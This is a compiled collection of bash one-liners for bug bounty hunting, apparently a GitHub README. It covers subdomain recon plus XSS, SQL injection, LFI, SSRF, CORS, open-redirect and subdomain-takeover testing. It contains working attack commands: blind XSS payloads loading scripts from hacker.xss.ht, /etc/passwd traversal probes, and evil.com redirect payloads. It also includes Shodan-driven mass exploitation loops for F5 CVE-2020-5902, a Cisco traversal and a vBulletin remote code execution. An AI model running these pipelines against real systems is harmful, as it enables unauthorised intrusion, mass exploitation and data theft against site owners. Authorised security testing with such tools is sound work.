# oneliner commands for bug bounties

## Find Subdomain
> projectdiscovery
```bash
subfinder -d target.com -silent | httpx -silent -o urls.txt
```
## Search Subdomain using Gospider
> https://github.com/KingOfBugbounty/KingOfBugBountyTips/
```bash
gospider -d 0 -s "https://site.com" -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```
## Search Sqli
```
cat domain | subfinder -d | httpx -nc -t 300 -p 80,443,8080,8443,8090,9090 -silent | katana >> sqli;  sqlmap -m sqli --batch --random-agent --level 4
```
## find .git/HEAD
> @ofjaaah
```bash
curl -s "https://crt.sh/?q=%25.tesla.com&output=json" | jq -r '.[].name_value' | assetfinder -subs-only | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Check .git/HEAD
> @ofjaaah
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv | cat domains.txt | sed 's#$#/.git/HEAD#g' | httpx -silent -content-length -status-code 301,302 -timeout 3 -retries 0 -ports 80,8080,443 -threads 500 -title | anew
```

## Find XSS
> cihanmehmet
### Single target
```bash
gospider -s "https://www.target.com/" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
### Multiple target
```bash
gospider -S urls.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe -o result.txt
```
## Find XSS
> dwisiswant0
```bash
#/bin/bash

hakrawler -url "${1}" -plain -usewayback -wayback | grep "${1}" | grep "=" | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace -a | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | dalfox pipe -b https://your.xss.ht

# save to .sh, and run bash program.sh target.com
```
## Kxss to search param XSS
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
echo http://testphp.vulnweb.com/ | waybackurls | kxss
```

## XSS hunting multiple
> @ofjaaah
```bash
gospider -S domain.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## BXSS - Bling XSS in Parameters
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script src=https://hacker.xss.ht></script>' -parameters
```

## Blind XSS In X-Forwarded-For Header
> [ethicalhackingplayground](https://github.com/ethicalhackingplayground/bxss/)
```bash
subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
```

## Gxss with single target
> @KathanP19
```bash
echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
```

## XSS using gf with single target
> @infosecMatter
```bash
echo "http://testphp.vulnweb.com/" | waybackurls | httpx -silent -timeout 2 -threads 100 | gf xss | anew 
```

## XSS without gf
> HacktifyS
```bash
waybackurls testphp.vulnweb.com| grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```
`or`
```bash
gospider -S target.txt -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | grep '=' |qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -s --path-as-is --insecure "$host" | grep -qs "<script>alert(1)</script>" && echo "$host \033[0;31m" Vulnerable;done
```

## XSS qsreplace
> @KingOfBugBounty
```bash
gospider -a -s https://site.com -t 3 -c 100 |  tr " " "\n" | grep -v ".js" | grep "https://" | grep "=" | qsreplace '%22><svg%20onload=confirm(1);>'
```

## XSS httpx
> @ofjaah
```bash
httpx -l master.txt -silent -no-color -threads 300 -location 301,302 | awk '{print $2}' | grep -Eo "(http|https)://[^/"].* | tr -d '[]' | anew  | xargs -I@ sh -c 'gospider -d 0 -s @' | tr ' ' '\n' | grep -Eo '(http|https)://[^/"].*' | grep "=" | qsreplace "<svg onload=alert(1)>"
```
## Automating XSS using Dalfox, GF and Waybackurls
> [Automating XSS using Dalfox, GF and Waybackurls](https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75)
```bash
cat test.txt | gf xss | sed ‘s/=.*/=/’ | sed ‘s/URL: //’ | tee testxss.txt ; dalfox file testxss.txt -b yours-xss-hunter-domain(e.g yours.xss.ht)
```

## XSS from javascript hidden params
> @0xJin
```bash
assetfinder *.com | gau | egrep -v '(.css|.svg)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Z0-9]+" | sed -e 's,'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'); echo -e "\e[1;33m$url\n\e[1;32m$vars"
```

## XSS freq
> @ofjaaah
```bash
echo http://testphp.vulnweb.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq
```

## Find xss
> @skothastad
```bash
cat targets | waybackurls | anew | grep "=" | gf xss | nilo | Gxss -p test | dalfox pipe --skip-bav --only-poc r --silence --skip-mining-dom --ignore-return 302,404,403
```

> @mamunwhh
```bash
cat hosts.txt | ffuf -w - -u "FUZZ/sign-in?next=javascript:alert(1);" -mr "javascript:alert(1)" 
```

> @SaraBadran18
```bash
cat domainlist.txt | subfinder | dnsx | waybackurl | egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | uro | dalfox pipe -b your.xss.ht -o xss.txt
```

## Find XSS + knoxss
> @ofjaaah
```bash
echo "domain" | subfinder -silent | gauplus | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss[.]me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: APIKNOXSS\""}' | sh 
```

## Dump In-Scope Assests from Bounty Program
### BugCrowd Programs
> @dwisiswant0
```bash
curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
```

## Recon.dev
> @ofjaaah
```bash
curl "https://recon.dev/api/search?key=YOURAPIKEY&domain=target.com" |jq -r '.[].rawDomains[]' | sed 's/ //g' | anew |httpx -silent | xargs -I@ gospider -d 0 -s @ -c 5 -t 100 -d 5 --blacklist jpg,jpeg,gif,css,tif,tiff,png,ttf,woff,woff2,ico,pdf,svg,txt | grep -Eo '(http|https)://[^/"]+' | anew
```

## Jaeles scan to bugbounty targets.
> @KingOfBugbounty
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
```
> @ofjaah
```bash
curl -s "https://jldc.me/anubis/subdomains/sony.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | httpx -silent -threads 300 | anew | rush -j 10 'jaeles scan -s /jaeles-signatures/ -u {}'
```

## Nuclei scan to bugbounty targets.
> @hack_fish
```bash
wget https://raw.githubusercontent.com/arkadiyt/bounty-targets-data/master/data/domains.txt -nv ; cat domains.txt | httpx -silent | xargs -n 1 gospider -o output -s ; cat output/* | egrep -o 'https?://[^ ]+' | nuclei -t ~/nuclei-templates/ -o result.txt
```
> @ofjaah
```bash
amass enum -passive -norecursive -d https://target.com -o domain ; httpx -l domain -silent -threads 10 | nuclei -t nuclei-templates -o result -timeout 30
```

## Endpoints, by apks
> @ofjaaah
```bash
apktool d app.apk -o uberApk;grep -Phro "(https?://)[\w\.-/]+[\"'\`]" uberApk/ | sed 's#"##g' | anew | grep -v "w3\|android\|github\|http://schemas.android\|google\|http://goo.gl"
```

## Find Subdomains TakeOver
> hahwul
```bash
subfinder -d {target} >> domains ; assetfinder -subs-only {target} >> domains ; amass enum -norecursive -noalts -d {target} >> domains ; subjack -w domains -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```

## CORS Misconfiguration
> manas_hunter
```bash
site="https://example.com"; gau "$site" | while read url;do target=$(curl -s -I -H "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found]echo $url;else echo Nothing on "$url";fi;done
```

## SQL Injection
> @ofjaaah
```bash
findomain -t http://testphp.vulnweb.com -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli -batch --random-agent --level 1
```

## Search SQLINJECTION using qsreplace search syntax error
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
grep "="  .txt| qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100 | grep -q -rn "syntax\|mysql" output 2>/dev/null && \printf "TARGET \033[0;32mCould Be Exploitable\e[m\n" || printf "TARGET \033[0;31mNot Vulnerable\e[m\n"
```

## SQLi-TimeBased scanner
> @slv0d
```bash
gau DOMAIN.tld  | sed 's/=[^=&]*/=YOUR_PAYLOAD/g' | grep ?*= | sort -u | while read host;do (time -p curl -Is $host) 2>&1 | awk '/real/ { r=$2;if (r >= TIME_OF_SLEEP ) print h " => SQLi Time-Based vulnerability"}' h=$host ;done
```

## Recon to search SSRF Test
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)
```bash
findomain -t DOMAIN -q | httpx -silent -threads 1000 | gau |  grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

## Using shodan & Nuclei
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

Shodan is a search engine that lets the user find specific types of computers connected to the internet, AWK Cuts the text and prints the third column. httpx is a fast and multi-purpose HTTP using -silent. Nuclei is a fast tool for configurable targeted scanning based on templates offering massive extensibility and ease of use, You need to download the nuclei templates.
```bash
shodan domain DOMAIN TO BOUNTY | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

## Using Chaos to jaeles "How did I find a critical today?.
> [KingOfBugbounty](https://github.com/KingOfBugbounty/KingOfBugBountyTips)

To chaos this project to projectdiscovery, Recon subdomains, using httpx, if we see the output from chaos domain.com we need it to be treated as http or https, so we use httpx to get the results. We use anew, a tool that removes duplicates from @TomNomNom, to get the output treated for import into jaeles, where he will scan using his templates.
```bash
chaos -d domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 
```
edited **if we don't have chaos api_key**
```bash
cat domain | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s ~/Tools/jaeles-signatures -u @
```

## Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
> @sratarun
```bash
cat domains.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: xss.yourburpcollabrotort'|grep xss) xss4=$(curl -s -L $url --request-target http://burpcollaborator/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://xss.yourburpcollabrotort HTTP/1.1 ""\n";done\
```

### Local File Inclusion
> @dwisiswant0
```bash
gau domain.tld | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```

### Open-redirect
> @dwisiswant0
```bash
export LHOST="http://localhost"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```

## Directory Listing

### (Feroxbuster) common command
```bash
feroxbuster -u https://target.com --insecure -d 1 -e -L 4 -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt
```
### (Feroxbuster) Multiple values
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
feroxbuster -u http://127.1 -x pdf -x js,html -x php txt json,docx
```
### (Feroxbuster) Read urls from STDIN; pipe only resulting urls out to another tool
> @epi052 or [feroxbuster](https://github.com/epi052/feroxbuster)
```bash
cat targets | ./feroxbuster --stdin --silent -s 200 301 302 --redirects -x js | fff -s 200 -o js-files
```

# search javascript file
> @ofjaaah
```bash
gau -subs DOMAIN |grep -iE '\.js'|grep -iEv '(\.jsp|\.json)' >> js.txt
```

# Uncover
>  [projectdiscovery/uncover](https://github.com/projectdiscovery/uncover)
```bash
uncover -q http.title:"GitLab" -silent | httpx -silent | nuclei
uncover -q target -f ip | naabu
echo jira | uncover -e shodan,censys -silent
```
> @ofjaah
```bash
uncover -q 'org:"DoD Network Information Center"' | httpx -silent | nuclei -silent -severity low,medium,high,critical
```

# Find admin login
> @0x_rood
```bash
cat domains_list.txt | httpx -ports 80,443,8080,8443 -path /admin -mr "admin"
```

# 403 login Bypass
> @_bughunter
```bash
cat hosts.txt | httpx -path /login -p 80,443,8080,8443 -mc 401,403 -silent -t 300 | unfurl format %s://%d | httpx -path //login -mc 200 -t 300 -nc -silent
```

# Recon Parameters
```bash
echo tesla.com | subfinder -silent | httpx -silent | cariddi -intensive
```
................................................................................................................
Local File Inclusion

    @dwisiswant0

gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'

Open-redirect

    @dwisiswant0

export LHOST="URL"; gau $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'

    @N3T_hunt3r

cat URLS.txt | gf url | tee url-redirect.txt && cat url-redirect.txt | parallel -j 10 curl --proxy http://127.0.0.1:8080 -sk > /dev/null

XSS

    @cihanmehmet

gospider -S URLS.txt -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep -e "code-200" | awk '{print $5}'| grep "=" | qsreplace -a | dalfox pipe | tee OUT.txt

    @fanimalikhack

waybackurls HOST | gf xss | sed 's/=.*/=/' | sort -u | tee FILE.txt && cat FILE.txt | dalfox -b YOURS.xss.ht pipe > OUT.txt

    @oliverrickfors

cat HOSTS.txt | getJS | httpx --match-regex "addEventListener\((?:'|\")message(?:'|\")"

Prototype Pollution

    @R0X4R

subfinder -d HOST -all -silent | httpx -silent -threads 300 | anew -q FILE.txt && sed 's/$/\/?__proto__[testparam]=exploit\//' FILE.txt | page-fetch -j 'window.testparam == "exploit"? "[VULNERABLE]" : "[NOT VULNERABLE]"' | sed "s/(//g" | sed "s/)//g" | sed "s/JS //g" | grep "VULNERABLE"

CVE-2020–5902

    @Madrobot_

shodan search http.favicon.hash:-335242539 "3992" --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl --silent --path-as-is --insecure "https://$host/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd" | grep -q root && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done

CVE-2020–3452

    @vict0ni

while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < HOSTS.txt

CVE-2022–0378

    @7h3h4ckv157

cat URLS.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodules%2Fmanage&id=test%22+onmousemove%3dalert(1)+xx=%22test&from_url=x"|grep -qs "onmouse" && echo "$h: VULNERABLE"; done

vBulletin 5.6.2 — ‘widget_tabbedContainer_tab_panel’ Remote Code Execution

    @Madrobot_

shodan search http.favicon.hash:-601665621 --fields ip_str,port --separator " " | awk '{print $1":"$2}' | while read host do ;do curl -s http://$host/ajax/render/widget_tabbedcontainer_tab_panel -d 'subWidgets[0][template]=widget_php&subWidgets[0][config][code]=phpinfo();' | grep -q phpinfo && \printf "$host \033[0;31mVulnerable\n" || printf "$host \033[0;32mNot Vulnerable\n";done;

Find JavaScript Files

    @D0cK3rG33k

assetfinder --subs-only HOST | gau | egrep -v '(.css|.png|.jpeg|.jpg|.svg|.gif|.wolf)' | while read url; do vars=$(curl -s $url | grep -Eo "var [a-zA-Zo-9_]+" | sed -e 's, 'var','"$url"?',g' -e 's/ //g' | grep -v '.js' | sed 's/.*/&=xss/g'):echo -e "\e[1;33m$url\n" "\e[1;32m$vars"; done

Extract Endpoints from JavaScript

    @renniepak

cat FILE.js | grep -oh "\"\/[a-zA-Z0-9_/?=&]*\"" | sed -e 's/^"//' -e 's/"$//' | sort -u

Get CIDR & Org Information from Target Lists

    @steve_mcilwain

for HOST in $(cat HOSTS.txt);do echo $(for ip in $(dig a $HOST +short); do whois $ip | grep -e "CIDR\|Organization" | tr -s " " | paste - -; d
one | uniq); done

Get Subdomains from RapidDNS.io

    @andirrahmani1

curl -s "https://rapiddns.io/subdomain/$1?full=1#result" | grep "<td><a" | cut -d '"' -f 2 | grep http | cut -d '/' -f3 | sed 's/#results//g' | sort -u

Get Subdomains from BufferOver.run

    @_ayoubfathi_

curl -s https://dns.bufferover.run/dns?q=.HOST.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u

    @AnubhavSingh_

export domain="HOST"; curl "https://tls.bufferover.run/dns?q=$domain" | jq -r .Results'[]' | rev | cut -d ',' -f1 | rev | sort -u | grep "\.$domain"

Get Subdomains from Riddler.io

    @pikpikcu

curl -s "https://riddler.io/search/exportcsv?q=pld:HOST" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from VirusTotal

    @pikpikcu

curl -s "https://www.virustotal.com/ui/domains/HOST/subdomains?limit=40" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomain with cyberxplore

    @pikpikcu

curl https://subbuster.cyberxplore.com/api/find?domain=HOST -s | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+"

Get Subdomains from CertSpotter

    @caryhooper

curl -s "https://certspotter.com/api/v1/issuances?domain=HOST&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from Archive

    @pikpikcu

curl -s "http://web.archive.org/cdx/search/cdx?url=*.HOST/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u

Get Subdomains from JLDC

    @pikpikcu

curl -s "https://jldc.me/anubis/subdomains/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u

Get Subdomains from securitytrails

    @pikpikcu

curl -s "https://securitytrails.com/list/apex_domain/HOST" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u

Bruteforcing Subdomain using DNS Over

    @pikpikcu

while read sub; do echo "https://dns.google.com/resolve?name=$sub.HOST&type=A&cd=true" | parallel -j100 -q curl -s -L --silent  | grep -Po '[{\[]{1}([,:{}\[\]0-9.\-+Eaeflnr-u \n\r\t]|".*?")+[}\]]{1}' | jq | grep "name" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | grep ".HOST" | sort -u ; done < FILE.txt

Get Subdomains With sonar.omnisint.io

    @pikpikcu

curl --silent https://sonar.omnisint.io/subdomains/HOST | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

Get Subdomains With synapsint.com

    @pikpikcu

curl --silent -X POST https://synapsint.com/report.php -d "name=https%3A%2F%2FHOST" | grep -oE "[a-zA-Z0-9._-]+\.HOST" | sort -u

Get Subdomains from crt.sh

    @vict0ni

curl -s "https://crt.sh/?q=%25.HOST&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u

Sort & Tested Domains from Recon.dev

    @stokfedrik

curl "https://recon.dev/api/search?key=apikey&domain=HOST" |jq -r '.[].rawDomains[]' | sed 's/ //g' | sort -u | httpx -silent

Subdomain Bruteforcer with FFUF

    @GochaOqradze

ffuf -u https://FUZZ.HOST -w FILE.txt -v | grep "| URL |" | awk '{print $4}'

Find Allocated IP Ranges for ASN from IP Address

    wains.be

whois -h whois.radb.net -i origin -T route $(whois -h whois.radb.net IP | grep origin: | awk '{print $NF}' | head -1) | grep -w "route:" | awk '{print $NF}' | sort -n

Extract IPs from a File

    @emenalf

grep -E -o '(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)' file.txt

Ports Scan without CloudFlare

    @dwisiswant0

subfinder -silent -d HOST | filter-resolved | cf-check | sort -u | naabu -rate 40000 -silent -verify | httprobe

Create Custom Wordlists

    @tomnomnom

gau HOST | unfurl -u keys | tee -a FILE1.txt; gau HOST | unfurl -u paths | tee -a FILE2.txt; sed 's#/#\n#g' FILE2.txt | sort -u | tee -a FILE1.txt | sort -u; rm FILE2.txt  | sed -i -e 's/\.css\|\.png\|\.jpeg\|\.jpg\|\.svg\|\.gif\|\.wolf\|\.bmp//g' FILE1.txtcat HOSTS.txt | httprobe | xargs curl | tok | tr '[:upper:]' '[:lower:]' | sort -u | tee -a FILE.txt

Extracts Juicy Informations

    @Prial Islam Khan

for sub in $(cat HOSTS.txt); do gron "https://otx.alienvault.com/otxapi/indicator/hostname/url_list/$sub?limit=100&page=1" | grep "\burl\b" | gron --ungron | jq | egrep -wi 'url' | awk '{print $2}' | sed 's/"//g'| sort -u | tee -a OUT.txt  ;done

Find Subdomains TakeOver

    @hahwul

subfinder -d HOST >> FILE; assetfinder --subs-only HOST >> FILE; amass enum -norecursive -noalts -d HOST >> FILE; subjack -w FILE -t 100 -timeout 30 -ssl -c $GOPATH/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ;

Dump Custom URLs from ParamSpider

    @hahwul

cat HOSTS.txt | xargs -I % python3 paramspider.py -l high -o ./OUT/% -d %;

URLs Probing with cURL + Parallel

    @akita_zen

cat HOSTS.txt | parallel -j50 -q curl -w 'Status:%{http_code}\t  Size:%{size_download}\t %{url_effective}\n' -o /dev/null -sk

Dump In-scope Assets from chaos-bugbounty-list

    @dwisiswant0

curl -sL https://github.com/projectdiscovery/public-bugbounty-programs/raw/master/chaos-bugbounty-list.json | jq -r '.programs[].domains | to_entries | .[].value'

Dump In-scope Assets from bounty-targets-data

    @dwisiswant0

HackerOne Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/blob/master/data/hackerone_data.json?raw=true | jq -r '.[].targets.in_scope[] | [.asset_identifier, .asset_type] | @tsv'

BugCrowd Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

Intigriti Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/intigriti_data.json | jq -r '.[].targets.in_scope[] | [.endpoint, .type] | @tsv'

YesWeHack Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/yeswehack_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

HackenProof Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/hackenproof_data.json | jq -r '.[].targets.in_scope[] | [.target, .type, .instruction] | @tsv'

Federacy Programs

curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/federacy_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'

Dump URLs from sitemap.xml

    @healthyoutlet

curl -s http://HOST/sitemap.xml | xmllint --format - | grep -e 'loc' | sed -r 's|</?loc>||g'

Pure Bash Linkfinder

    @ntrzz

curl -s $1 | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort | uniq | grep ".js" > FILE.txt; while IFS= read link; do python linkfinder.py -i "$link" -o cli; done < FILE.txt | grep $2 | grep -v $3 | sort -n | uniq; rm -rf FILE.txt

Extract Endpoints from swagger.json

    @zer0pwn

curl -s https://HOST/v2/swagger.json | jq '.paths | keys[]'

CORS Misconfiguration

    @manas_hunter

site="URL"; gau "$site" | while read url; do target=$(curl -sIH "Origin: https://evil.com" -X GET $url) | if grep 'https://evil.com'; then [Potentional CORS Found] echo $url; else echo Nothing on "$url"; fi; done

Find Hidden Servers and/or Admin Panels

    @rez0__

ffuf -c -u URL -H "Host: FUZZ" -w FILE.txt

Recon Using api.recon.dev

    @z0idsec

curl -s -w "\n%{http_code}" https://api.recon.dev/search?domain=HOST | jg .[].domain

Find Live Host/Domain/Assets

    @YashGoti

subfinder -d HOST -silent | httpx -silent -follow-redirects -mc 200 | cut -d '/' -f3 | sort -u

XSS without gf

    @HacktifyS

waybackurls HOST | grep '=' | qsreplace '"><script>alert(1)</script>' | while read host do ; do curl -sk --path-as-is "$host" | grep -qs "<script>alert(1)</script>" && echo "$host is vulnerable"; done

Get Subdomains from IPs

    @laughface809

python3 hosthunter.py HOSTS.txt > OUT.txt

Gather Domains from Content-Security-Policy

    @geeknik

curl -vs URL --stderr - | awk '/^content-security-policy:/' | grep -Eo "[a-zA-Z0-9./?=_-]*" |  sed -e '/\./!d' -e '/[^A-Za-z0-9._-]/d' -e 's/^\.//' | sort -u

................................................................................................................

###### Thanks to all who create these Awesome One Liners❤️
----------------------
![image](https://user-images.githubusercontent.com/75373225/180003557-59bf909e-95e5-4b31-b4f8-fc05532f9f7c.png)
---------------------------
# Subdomain Enumeration
**Juicy Subdomains**
```
subfinder -d target.com -silent | dnsprobe -silent | cut -d ' ' -f1  | grep --color 'api\|dev\|stg\|test\|admin\|demo\|stage\|pre\|vpn'
```
**from BufferOver.run**
```
curl -s https://dns.bufferover.run/dns?q=.target.com | jq -r .FDNS_A[] | cut -d',' -f2 | sort -u 
```
**from Riddler.io**
```
curl -s "https://riddler.io/search/exportcsv?q=pld:target.com" | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u 
```
**from nmap**
```
nmap --script hostmap-crtsh.nse target.com
```
**from CertSpotter**
```
curl -s "https://certspotter.com/api/v1/issuances?domain=target.com&include_subdomains=true&expand=dns_names" | jq .[].dns_names | grep -Po "(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from Archive**
```
curl -s "http://web.archive.org/cdx/search/cdx?url=*.target.com/*&output=text&fl=original&collapse=urlkey" | sed -e 's_https*://__' -e "s/\/.*//" | sort -u
```
**from JLDC**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | sort -u
```
**from crt.sh**
```
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u
```
**from ThreatMiner**
```
curl -s "https://api.threatminer.org/v2/domain.php?q=target.com&rt=5" | jq -r '.results[]' |grep -o "\w.*target.com" | sort -u
```
**from Anubis**
```
curl -s "https://jldc.me/anubis/subdomains/target.com" | jq -r '.' | grep -o "\w.*target.com"
```
**from ThreatCrowd**
```
curl -s "https://www.threatcrowd.org/searchApi/v2/domain/report/?domain=target.com" | jq -r '.subdomains' | grep -o "\w.*target.com"
```
**from HackerTarget**
```
curl -s "https://api.hackertarget.com/hostsearch/?q=target.com"
```
--------
## Subdomain Takeover:
```
cat subs.txt | xargs  -P 50 -I % bash -c "dig % | grep CNAME" | awk '{print $1}' | sed 's/.$//g' | httpx -silent -status-code -cdn -csp-probe -tls-probe
```
```
subjack -w subs -t 100 -timeout 30 -ssl -c ~/go/src/github.com/haccer/subjack/fingerprints.json -v 3 >> takeover ; 
```
-------------------------------
## LFI:
```
cat hosts | gau |  gf lfi |  httpx  -paths lfi_wordlist.txt -threads 100 -random-agent -x GET,POST  -tech-detect -status-code  -follow-redirects -mc 200 -mr "root:[x*]:0:0:"
```
```
waybackurls target.com | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -c 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
```
```
cat targets.txt | while read host do ; do curl --silent --path-as-is --insecure "$host/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd" | grep "root:*" && echo "$host \033[0;31mVulnerable\n";done
```
```
gau http://target.com | gf lfi | qsreplace "/etc/passwd" | httpx -t 250 -mr "root:x" 
```
----------------------
## Open Redirect:
```
waybackurls target.com | grep -a -i \=http | qsreplace 'http://evil.com' | while read host do;do curl -s -L $host -I| grep "http://evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
```
```
export LHOST="URL"; waybackurls $1 | gf redirect | qsreplace "$LHOST" | xargs -I % -P 25 sh -c 'curl -Is "%" 2>&1 | grep -q "Location: $LHOST" && echo "VULN! %"'
```
```
